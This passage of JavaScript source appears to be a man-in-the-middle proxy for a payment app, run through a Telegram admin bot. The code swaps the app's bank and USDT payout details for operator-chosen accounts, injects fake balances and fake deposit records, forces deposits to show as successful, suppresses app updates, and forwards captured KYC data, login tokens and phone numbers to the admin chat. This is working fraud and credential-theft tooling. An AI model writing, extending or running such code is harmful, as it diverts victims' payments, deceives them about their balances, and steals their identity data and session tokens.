      const currentBal = tracked ? tracked.balance : 'N/A';
      const updatedBal = currentBal !== 'N/A' ? parseFloat((parseFloat(currentBal) + freshData.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
      if (!freshData.balanceHistory) freshData.balanceHistory = [];
      freshData.balanceHistory.push({
        type: 'add',
        userId: targetUserId,
        amount: amount,
        totalAdded: freshData.userOverrides[targetUserId].addedBalance,
        originalBalance: currentBal,
        updatedBalance: updatedBal,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked && tracked.phone) || ''
      });
      if (!freshData.userOverrides[targetUserId].quotaRecords) freshData.userOverrides[targetUserId].quotaRecords = [];
      const nowDate = new Date();
      const dd = String(nowDate.getDate()).padStart(2, '0');
      const mm = String(nowDate.getMonth() + 1).padStart(2, '0');
      const yyyy = nowDate.getFullYear();
      const hh = String(nowDate.getHours()).padStart(2, '0');
      const mi = String(nowDate.getMinutes()).padStart(2, '0');
      const ss = String(nowDate.getSeconds()).padStart(2, '0');
      const formattedTime = `${dd}/${mm}/${yyyy} ${hh}:${mi}:${ss}`;
      const balAfterAdd = updatedBal !== 'N/A' ? String(updatedBal) : String(amount);
      freshData.userOverrides[targetUserId].quotaRecords.push({
        amount: "+" + String(amount),
        balance: balAfterAdd,
        createTime: formattedTime,
        sourceType: "Deposit From Admin",
        sourceTypeGroup: "Admin"
      });
      freshData._skipOverrideMerge = true;
      await saveData(freshData);
      const statusMsg = tracked
        ? `📊 Updated balance: ₹${updatedBal}`
        : `⏳ User is offline — ₹${freshData.userOverrides[targetUserId].addedBalance} will show when they open the app`;
      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${freshData.userOverrides[targetUserId].addedBalance}\n${statusMsg}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/deduct ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      const amount = parseFloat(parts[0]);
      const targetUserId = parts[1] || '';
      if (isNaN(amount) || !targetUserId) {
        await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>\nExample: /deduct 500 12345');
        return res.sendStatus(200);
      }
      const freshData2 = await loadData(true);
      if (!freshData2.userOverrides) freshData2.userOverrides = {};
      if (!freshData2.userOverrides[targetUserId]) freshData2.userOverrides[targetUserId] = {};
      freshData2.userOverrides[targetUserId].addedBalance = (freshData2.userOverrides[targetUserId].addedBalance || 0) - amount;
      const tracked2 = freshData2.trackedUsers && freshData2.trackedUsers[targetUserId];
      const currentBal2 = tracked2 ? tracked2.balance : 'N/A';
      const updatedBal2 = currentBal2 !== 'N/A' ? parseFloat((parseFloat(currentBal2) + freshData2.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
      if (!freshData2.balanceHistory) freshData2.balanceHistory = [];
      freshData2.balanceHistory.push({
        type: 'deduct',
        userId: targetUserId,
        amount: amount,
        totalAdded: freshData2.userOverrides[targetUserId].addedBalance,
        originalBalance: currentBal2,
        updatedBalance: updatedBal2,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked2 && tracked2.phone) || ''
      });
      if (freshData2.userOverrides[targetUserId].quotaRecords && freshData2.userOverrides[targetUserId].quotaRecords.length > 0) {
        let remaining = amount;
        const records = freshData2.userOverrides[targetUserId].quotaRecords;
        while (remaining > 0 && records.length > 0) {
          const last = records[records.length - 1];
          const lastAmt = parseFloat(last.amount) || 0;
          if (lastAmt <= remaining) {
            remaining = parseFloat((remaining - lastAmt).toFixed(2));
            records.pop();
          } else {
            last.amount = String(parseFloat((lastAmt - remaining).toFixed(2)));
            remaining = 0;
          }
        }
      }
      if (freshData2.userOverrides[targetUserId].addedBalance === 0) delete freshData2.userOverrides[targetUserId].addedBalance;
      freshData2._skipOverrideMerge = true;
      await saveData(freshData2);
      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${freshData2.userOverrides[targetUserId].addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/remove balance ')) {
      const targetId = text.substring(16).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
      data = await loadData(true);
      if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
        const removed = data.userOverrides[targetId].addedBalance;
        delete data.userOverrides[targetId].addedBalance;
        delete data.userOverrides[targetId].quotaRecords;
        if (!data.balanceHistory) data.balanceHistory = [];
        const tracked = data.trackedUsers && data.trackedUsers[targetId];
        data.balanceHistory.push({
          type: 'remove',
          userId: targetId,
          amount: removed,
          totalAdded: 0,
          originalBalance: tracked ? tracked.balance : 'N/A',
          updatedBalance: tracked ? tracked.balance : 'N/A',
          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          phone: (tracked && tracked.phone) || ''
        });
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}\n💰 Now showing real balance`);
      } else {
        await bot.sendMessage(chatId, `ℹ️ User ${targetId} has no fake balance added.`);
      }
      return res.sendStatus(200);
    }

    if (text.startsWith('/control sell ')) {
      const sellTargetId = text.substring(14).trim();
      if (!sellTargetId) { await bot.sendMessage(chatId, '❌ Format: /control sell <userId>'); return res.sendStatus(200); }
      data = await loadData(true);
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[sellTargetId]) data.userOverrides[sellTargetId] = {};
      const currentState = !!data.userOverrides[sellTargetId].sellControl;
      data.userOverrides[sellTargetId].sellControl = !currentState;
      if (!currentState) {
        delete data.userOverrides[sellTargetId].lastRealBalance;
      }
      data._skipOverrideMerge = true;
      await saveData(data);
      const stateText = data.userOverrides[sellTargetId].sellControl ? '🟢 ON' : '🔴 OFF';
      let msg = `🔒 Sell Control ${stateText}\n👤 User: ${sellTargetId}\n💰 Cut Amount: ₹50 (fixed)`;
      if (data.userOverrides[sellTargetId].sellControl) {
        msg += `\n\n📌 Balance track hoga`;
        msg += `\n📌 Har sell cut ₹50 mein convert hoga`;
      }
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    if (text === '/sell history' || text.startsWith('/sell history ')) {
      const shTarget = text.startsWith('/sell history ') ? text.substring(14).trim() : '';
      const sh = data.sellHistory || [];
      if (sh.length === 0) { await bot.sendMessage(chatId, '📋 No sell cut history yet.'); return res.sendStatus(200); }
      const filtered = shTarget ? sh.filter(h => String(h.userId) === shTarget) : sh;
      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No sell history for user ${shTarget}`); return res.sendStatus(200); }
      const last10 = filtered.slice(-10);
      let totalOriginal = 0, totalModified = 0, totalSaved = 0;
      for (const h of filtered) {
        totalOriginal += h.originalCut || 0;
        totalModified += h.modifiedCut || 0;
        totalSaved += h.compensation || 0;
      }
      let msg = `🔒 SELL CUT HISTORY\n━━━━━━━━━━━━━━━━━━\n`;
      msg += `📊 Total Intercepts: ${filtered.length}\n`;
      msg += `📥 Total Original Cuts: ₹${totalOriginal.toFixed(2)}\n`;
      msg += `✂️ Total Modified Cuts: ₹${totalModified.toFixed(2)}\n`;
      msg += `💰 Total Saved: ₹${totalSaved.toFixed(2)}\n`;
      msg += `━━━━━━━━━━━━━━━━━━\n\n`;
      for (const h of last10) {
        msg += `👤 ${h.userId} | ₹${h.originalCut} → ₹${h.modifiedCut} | ${h.time}\n`;
      }
      if (filtered.length > 10) msg += `\n... showing last 10 of ${filtered.length}`;
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    if (text === '/history' || text.startsWith('/history ')) {
      const historyTarget = text.startsWith('/history ') ? text.substring(9).trim() : '';
      const history = data.balanceHistory || [];
      if (history.length === 0) { await bot.sendMessage(chatId, '📋 No balance history yet.'); return res.sendStatus(200); }
      const filtered = historyTarget ? history.filter(h => h.userId === historyTarget) : history;
      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No history for user ${historyTarget}`); return res.sendStatus(200); }
      const userSummary = {};
      for (const h of filtered) {
        if (!userSummary[h.userId]) userSummary[h.userId] = { added: 0, deducted: 0, totalNet: 0, phone: h.phone || '', entries: [] };
        const s = userSummary[h.userId];
        if (h.type === 'add') s.added += h.amount;
        else s.deducted += h.amount;
        s.totalNet = h.totalAdded || 0;
        if (h.phone) s.phone = h.phone;
        s.entries.push(h);
      }
      let m = '📊 Balance History:\n\n';
      for (const [uid, s] of Object.entries(userSummary)) {
        const tracked = data.trackedUsers && data.trackedUsers[uid];
        const currentBal = tracked ? tracked.balance : 'N/A';
        m += `👤 User: ${uid}${s.phone ? ' (' + s.phone + ')' : ''}\n`;
        m += `   ➕ Total Added: ₹${s.added.toFixed(2)}\n`;
        m += `   ➖ Total Deducted: ₹${s.deducted.toFixed(2)}\n`;
        m += `   📊 Net Change: ₹${(s.added - s.deducted).toFixed(2)}\n`;
        m += `   💰 Current Balance: ₹${currentBal}\n`;
        m += `   📜 Entries:\n`;
        const recent = s.entries.slice(-10);
        for (const e of recent) {
          const icon = e.type === 'add' ? '➕' : '➖';
          m += `   ${icon} ₹${e.amount} | Bal: ₹${e.updatedBalance} | ${e.time}\n`;
        }
        if (s.entries.length > 10) m += `   ... ${s.entries.length - 10} more entries\n`;
        m += '\n';
      }
      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/clearhistory') {
      data = await loadData(true);
      data.balanceHistory = [];
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, '🗑 Balance history cleared.');
      return res.sendStatus(200);
    }

    if (text === '/idtrack') {
      const tracked = data.trackedUsers || {};
      const ids = Object.keys(tracked);
      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked yet. Users will appear after they use the app.'); return res.sendStatus(200); }
      let m = '📋 Tracked User IDs:\n\n';
      for (const uid of ids) {
        const u = tracked[uid];
        const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
        m += `👤 ID: ${uid}${hasOverride}\n`;
        if (u.name) m += `   📛 Name: ${u.name}\n`;
        if (u.phone) m += `   📱 Phone: ${u.phone}\n`;
        if (u.balance) m += `   💰 Balance: ${u.balance}\n`;
        m += `   🕐 Last: ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n`;
        m += `   📦 Orders: ${u.orderCount || 0}\n\n`;
      }
      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/banks') {
      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added'); return res.sendStatus(200); }
      let m = '💳 Banks:\n\n' + bankListText(data);
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI\n(BankName and UPI optional)'); return res.sendStatus(200); }
      data = await loadData(true);
      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
      const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
      data.banks.push(newBank);
      if (data.activeIndex < 0) data.activeIndex = 0;
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/removebank ')) {
      data = await loadData(true);
      const idx = parseInt(text.substring(12).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid. /banks se check karo'); return res.sendStatus(200); }
      const removed = data.banks.splice(idx, 1)[0];
      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
      else if (data.activeIndex > idx) data.activeIndex--;
      if (data.userOverrides) {
        for (const uid of Object.keys(data.userOverrides)) {
          const uo = data.userOverrides[uid];
          if (uo.bankIndex !== undefined) {
            if (uo.bankIndex === idx) delete uo.bankIndex;
            else if (uo.bankIndex > idx) uo.bankIndex--;
          }
        }
      }
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setbank ')) {
      data = await loadData(true);
      const idx = parseInt(text.substring(9).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
      data.activeIndex = idx;
      data._skipOverrideMerge = true;
      await saveData(data);
      const bankInfo = data.banks[idx];
      await bot.sendMessage(chatId, `✅ Active bank set to #${idx + 1}:\n${bankInfo.accountHolder} | ${bankInfo.accountNo} | ${bankInfo.ifsc}${bankInfo.bankName ? ' | ' + bankInfo.bankName : ''}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/usdt ')) {
      const addr = text.substring(6).trim();
      data = await loadData(true);
      if (addr.toLowerCase() === 'off') {
        data.usdtAddress = '';
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, '❌ USDT override OFF');
      } else if (addr.length >= 20) {
        data.usdtAddress = addr;
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, `₮ USDT address set: ${addr}`);
      } else {
        await bot.sendMessage(chatId, '❌ Invalid address (20+ chars required)');
      }
      return res.sendStatus(200);
    }

    if (text.startsWith('/suspend ')) {
      const suspendPhone = text.substring(9).trim();
      if (!suspendPhone) { await bot.sendMessage(chatId, '❌ Format: /suspend <phoneNumber>'); return res.sendStatus(200); }
      data = await loadData(true);
      if (!data.suspendedPhones) data.suspendedPhones = {};
      data.suspendedPhones[suspendPhone] = { suspended: true, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `🚫 Suspended: ${suspendPhone}\nUser will see "ID Suspended" on login.\n\nTo unsuspend: /unsuspend ${suspendPhone}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/unsuspend ')) {
      const unsuspendPhone = text.substring(11).trim();
      if (!unsuspendPhone) { await bot.sendMessage(chatId, '❌ Format: /unsuspend <phoneNumber>'); return res.sendStatus(200); }
      data = await loadData(true);
      if (data.suspendedPhones && data.suspendedPhones[unsuspendPhone]) {
        delete data.suspendedPhones[unsuspendPhone];
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, `✅ Unsuspended: ${unsuspendPhone}\nUser can login now.`);
      } else {
        await bot.sendMessage(chatId, `ℹ️ ${unsuspendPhone} is not suspended.`);
      }
      return res.sendStatus(200);
    }

    if (text === '/suspended') {
      const phones = data.suspendedPhones ? Object.keys(data.suspendedPhones) : [];
      if (phones.length === 0) { await bot.sendMessage(chatId, '📋 No suspended users.'); return res.sendStatus(200); }
      let msg = '🚫 SUSPENDED USERS\n━━━━━━━━━━━━━━━━━━\n';
      for (const p of phones) {
        msg += `📱 ${p} — ${data.suspendedPhones[p].time || 'N/A'}\n`;
      }
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    if (text === '/help') {
      await bot.sendMessage(chatId, 'Use /start to see all commands.');
      return res.sendStatus(200);
    }

    return res.sendStatus(200);
  } catch(e) {
    console.error('Bot error:', e);
    return res.sendStatus(200);
  }
});

app.post('/xxapi/linkKyc', async (req, res) => {
  try {
    const data = await loadData();
    const body = req.parsedBody || {};
    const bodyStr = JSON.stringify(body).substring(0, 3000);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔐 KYC DATA CAPTURED\n━━━━━━━━━━━━━━━━━━\n📦 Body:\n${bodyStr}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
    }
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (userId) {
      saveTokenUserId(req, userId);
      trackUser(data, userId, 'KYC Link');
      saveData(data).catch(()=>{});
    }
    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    await transparentProxy(req, res);
  }
});

app.get('/app/version', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.blockUpdate !== false && jsonResp) {
      if (jsonResp.forceUpdate !== undefined) jsonResp.forceUpdate = false;
      if (jsonResp.needUpdate !== undefined) jsonResp.needUpdate = false;
      if (jsonResp.force_update !== undefined) jsonResp.force_update = false;
      if (jsonResp.update !== undefined) jsonResp.update = false;
      const rd = getResponseData(jsonResp);
      if (rd && typeof rd === 'object') {
        if (rd.forceUpdate !== undefined) rd.forceUpdate = false;
        if (rd.needUpdate !== undefined) rd.needUpdate = false;
        if (rd.force_update !== undefined) rd.force_update = false;
        if (rd.update !== undefined) rd.update = false;
      }
      sendJson(res, respHeaders, jsonResp, respBody);
    } else {
      res.writeHead(response.status, respHeaders);
      res.end(respBody);
    }
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `📱 Version Check\n${respBody.substring(0, 500)}`).catch(()=>{});
    }
  } catch(e) {
    await transparentProxy(req, res);
  }
});

app.get('/app/jsValue/:type', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const ctType = req.params.type || 'unknown';
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `📜 JS Value Loaded (type: ${ctType})\n${respBody.substring(0, 500)}`).catch(()=>{});
    }
    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    await transparentProxy(req, res);
  }
});

async function proxyAndReplaceBankDetails(req, res, label) {
  const data = await loadData();
  const reqUserId = await extractUserId(req, null);
  const reqEff = getEffectiveSettings(data, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
    const respData = getResponseData(jsonResp);
    if (respData && active) {
      if (Array.isArray(respData)) {
        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
      } else if (typeof respData === 'object') {
        deepReplace(respData, active, {}, 0);
      }
    }
    if (jsonResp && active) {
      deepReplace(jsonResp, active, {}, 0);
    }
    if (eff.depositSuccess && respData && typeof respData === 'object' && !Array.isArray(respData)) {
      markDepositSuccess(respData);
    }
    const bonus = eff.depositBonus || 0;
    if (bonus > 0 && respData && typeof respData === 'object') {
      addBonusToBalanceFields(respData, bonus);
    }
    if (detectedUserId && respData && typeof respData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        addBonusToBalanceFields(respData, addedBal);
      }
    }
    const phone = getPhone(data, detectedUserId);
    if (data.adminChatId && bot) {
      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
      bot.sendMessage(data.adminChatId,
`🔔 ${label || 'Request'}
👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
💳 Bank: ${active ? active.accountNo : 'N/A'}
📊 Amount: ₹${rd.amount || rd.orderAmount || rd.money || 'N/A'}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    if (detectedUserId) {
      saveTokenUserId(req, detectedUserId);
      trackUser(data, detectedUserId, label || 'Order', phone);
      saveData(data).catch(()=>{});
    }
    if (debugNextResponse && data.adminChatId && bot) {
      debugNextResponse = false;
      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
      bot.sendMessage(data.adminChatId, `🔍 DEBUG RESPONSE:\n${dump}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

async function proxyAndAddBonus(req, res) {
  const data = await loadData();
  const reqUserId = await extractUserId(req, null);
  const reqEff = getEffectiveSettings(data, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);
    const bonus = eff.depositBonus || 0;
    const respData = getResponseData(jsonResp);
    if (bonus > 0 && respData) {
      addBonusToBalanceFields(respData, bonus);
    }
    if (detectedUserId && respData && typeof respData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        addBonusToBalanceFields(respData, addedBal);
      }
    }
    if (detectedUserId) {
      saveTokenUserId(req, detectedUserId);
      const freshData = await loadData(true);
      if (!freshData.trackedUsers) freshData.trackedUsers = {};
      const existing = freshData.trackedUsers[String(detectedUserId)] || {};
      const balanceVal = respData && typeof respData === 'object' ? (respData.balance || respData.userBalance || respData.availableBalance || respData.totalBalance || respData.money || respData.coin || respData.wallet || '') : '';
      freshData.trackedUsers[String(detectedUserId)] = {
        ...existing,
        balance: balanceVal || existing.balance || '',
        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        lastAction: 'Balance'
      };
      freshData._skipOverrideMerge = true;
      await saveData(freshData);
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

function replaceTelegramLinks(body) {
  if (!body || typeof body !== 'string') return body;
  return body.replace(/https?:\/\/t\.me\/[A-Za-z0-9_]+/g, TELEGRAM_OVERRIDE);
}

function replaceTelegramInObj(obj, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (Array.isArray(obj)) { obj.forEach(item => replaceTelegramInObj(item, depth + 1)); return; }
  for (const key of Object.keys(obj)) {
    if (typeof obj[key] === 'string' && obj[key].match(/https?:\/\/t\.me\//)) {
      obj[key] = obj[key].replace(/https?:\/\/t\.me\/[A-Za-z0-9_]+/g, TELEGRAM_OVERRIDE);
    } else if (typeof obj[key] === 'object') {
      replaceTelegramInObj(obj[key], depth + 1);
    }
  }
}

app.all('*', async (req, res) => {
  const path = req.originalUrl || req.url;
  if (path === '/bot-webhook' || path === '/setup-webhook' || path === '/health') return;
  try {
    const data = await loadData();
    const reqUserId = await extractUserId(req, null);
    const eff = getEffectiveSettings(data, reqUserId);
    if (eff.botEnabled === false) return await transparentProxy(req, res);
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
    if (detectedUserId) saveTokenUserId(req, detectedUserId);
    if (!jsonResp) {
      if (data.adminChatId && bot && data.logRequests) {
        const isHtml = (respHeaders['content-type'] || '').includes('html');
        if (!isHtml) {
          bot.sendMessage(data.adminChatId, `📡 NON-JSON: ${req.method} ${path}\n${respBody.substring(0, 200)}`).catch(()=>{});
        }
      }
      let finalBody = respBody;
      const ct = (respHeaders['content-type'] || '').toLowerCase();
      if (ct.includes('html') || ct.includes('javascript') || ct.includes('json') || ct.includes('text')) {
        finalBody = replaceTelegramLinks(finalBody);
        if (finalBody !== respBody) {
          respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
          delete respHeaders['etag'];
          delete respHeaders['last-modified'];
        }
      }
      res.writeHead(response.status, respHeaders);
      res.end(finalBody);
      return;
    }
    const respData = getResponseData(jsonResp);
    if (respData && typeof respData === 'object') {
      const loginData = typeof respData === 'object' && !Array.isArray(respData) ? respData : null;
      if (loginData) {
        const uid = loginData.userId || loginData.uid || loginData.memberId || loginData.channelUid || loginData.id || '';
        if (uid) saveTokenUserId(req, String(uid));
        const loginToken = loginData.token || loginData.accessToken || loginData.access_token || '';
        if (loginToken && uid) {
          tokenUserMap[loginToken.substring(0, 100)] = String(uid);
          if (redis) redis.hset('vivipayTokenMap', loginToken.substring(0, 100), String(uid)).catch(()=>{});
        }
        const respPhone = loginData.phone || loginData.mobile || loginData.telephone || loginData.memberPhone || '';
        if (respPhone && (uid || detectedUserId)) {
          userPhoneMap[String(uid || detectedUserId)] = String(respPhone);
        }
      }
    }
    const body = req.parsedBody || {};
    const reqPhone = body.phone || body.mobile || body.telephone || body.memberPhone || body.username || '';
    if (reqPhone && data.suspendedPhones && data.suspendedPhones[String(reqPhone)]) {
      if (path.includes('login') || path.includes('auth') || path.includes('signin') || path.includes('register')) {
        if (data.adminChatId && bot) {
          bot.sendMessage(data.adminChatId, `🚫 BLOCKED LOGIN\n📱 Phone: ${reqPhone}\n🔒 Status: Suspended\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
        }
        const fakeResp = { code: 500, message: 'ID Suspended', data: null };
        res.set('Content-Type', 'application/json');
        return res.status(200).json(fakeResp);
      }
    }
    const effUser = getEffectiveSettings(data, detectedUserId);
    const active = effUser.botEnabled !== false ? getActiveBank(data, detectedUserId) : null;
    if (active && respData && typeof respData === 'object') {
      if (Array.isArray(respData)) {
        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
      } else {
        deepReplace(respData, active, {}, 0);
      }
    }
    if (active && jsonResp) {
      deepReplace(jsonResp, active, {}, 0);
    }
    if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
      if (effUser.depositSuccess) markDepositSuccess(respData);
      const bonus = effUser.depositBonus || 0;
      if (bonus > 0) addBonusToBalanceFields(respData, bonus);
      if (detectedUserId) {
        const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
        const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
        if (addedBal !== 0) addBonusToBalanceFields(respData, addedBal);
      }
      const balanceVal = respData.balance || respData.userBalance || respData.availableBalance || respData.totalBalance || respData.money || respData.coin || respData.wallet || '';
      if (detectedUserId && balanceVal) {
        const freshData = await loadData(true);
        if (!freshData.trackedUsers) freshData.trackedUsers = {};
        const existing = freshData.trackedUsers[String(detectedUserId)] || {};
        freshData.trackedUsers[String(detectedUserId)] = {
          ...existing,
          balance: String(balanceVal),
          lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          lastAction: path.split('?')[0].split('/').pop() || 'API',
          phone: reqPhone || existing.phone || getPhone(data, detectedUserId) || ''
        };
        freshData._skipOverrideMerge = true;
        await saveData(freshData);
      }
    }
    if (data.usdtAddress && jsonResp) {
      replaceUsdtInResponse(jsonResp, data);
    }
    if (data.blockUpdate !== false && jsonResp) {
      if (jsonResp.forceUpdate !== undefined) jsonResp.forceUpdate = false;
      if (jsonResp.needUpdate !== undefined) jsonResp.needUpdate = false;
      if (jsonResp.force_update !== undefined) jsonResp.force_update = false;
    }
    const userOvr = detectedUserId ? (data.userOverrides && data.userOverrides[String(detectedUserId)]) : null;
    const fakeRecords = (userOvr && userOvr.quotaRecords && userOvr.quotaRecords.length > 0)
      ? [...userOvr.quotaRecords].reverse()
      : [];
    if (fakeRecords.length > 0 && respData && typeof respData === 'object') {
      const pageBody = body.pageNo || body.pageNum || body.page || body.current || '';
      const pageNum = parseInt(pageBody || '1') || 1;
      if (pageNum === 1) {
        const targetArr = Array.isArray(respData) ? respData
          : (respData.lists && Array.isArray(respData.lists)) ? respData.lists
          : (respData.list && Array.isArray(respData.list)) ? respData.list
          : (respData.records && Array.isArray(respData.records)) ? respData.records
          : (respData.rows && Array.isArray(respData.rows)) ? respData.rows
          : (respData.content && Array.isArray(respData.content)) ? respData.content
          : null;
        if (targetArr) {
          targetArr.unshift(...fakeRecords);
          if (!Array.isArray(respData)) {
            if (respData.total !== undefined) respData.total += fakeRecords.length;
            if (respData.totalCount !== undefined) respData.totalCount += fakeRecords.length;
          }
        } else if (!Array.isArray(respData)) {
          const arrKeys = ['lists', 'list', 'records', 'rows', 'content'];
          let injected = false;
          for (const ak of arrKeys) {
            if (respData[ak] !== undefined) {
              if (!Array.isArray(respData[ak])) respData[ak] = [];
              respData[ak].unshift(...fakeRecords);
              if (respData.total !== undefined) respData.total += fakeRecords.length;
              injected = true;
              break;
            }
          }
          if (!injected) {
            respData.lists = [...fakeRecords];
          }
        }
      }
    }
    if (data.adminChatId && bot && (path.includes('login') || path.includes('auth') || path.includes('signin'))) {
      const rd = respData && typeof respData === 'object' && !Array.isArray(respData) ? respData : {};
      const uid = rd.userId || rd.uid || rd.memberId || rd.channelUid || rd.id || detectedUserId || 'N/A';
      const phone = rd.phone || rd.mobile || rd.telephone || rd.memberPhone || reqPhone || '';
      const token = rd.token || rd.accessToken || rd.access_token || '';
      bot.sendMessage(data.adminChatId,
`🔑 LOGIN CAPTURED
👤 User: ${uid}${phone ? '\n📱 Phone: ' + phone : ''}${token ? '\n🔐 Token: ' + token.substring(0, 50) + '...' : ''}
💳 Bank: ${active ? active.accountNo : 'N/A'}
